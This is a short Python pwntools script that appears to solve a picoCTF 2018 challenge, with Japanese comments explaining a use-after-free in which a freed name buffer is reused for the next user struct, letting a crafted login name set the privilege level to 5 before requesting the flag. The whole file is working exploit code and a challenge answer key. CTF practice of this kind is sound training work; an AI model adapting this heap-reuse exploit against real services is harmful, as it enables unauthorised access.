# coding: utf-8

# logout時 user->nameはfreeされるが、userはfreeされない
# 2回目以降のlogin時userは再割当てされるが、前回のuser->nameの位置に割り当てられる
# 1回目のLogin時のname指定で、次のloginでLevelに割り当てられるアドレスに0x00000005を仕込む

# example:
# first login struct user addr 0x603670, user->name addr 0x603690
# next login struct user addr 0x603690, next login user->level addr 0x603698

from pwn import *

host = '2018shell3.picoctf.com'
port = 33149
p = remote(host, port)
# p = process('./auth')

payload = 'A' * 8 + p32(0x5)

p.recvuntil('Enter your command:')
p.sendline('login ' + payload)

# logout
p.recvuntil('Enter your command:')
p.sendline('reset')

# re login
p.recvuntil('Enter your command:')
p.sendline('login a')

# get flag
p.recvuntil('Enter your command:')
p.sendline('get-flag')

p.interactive()
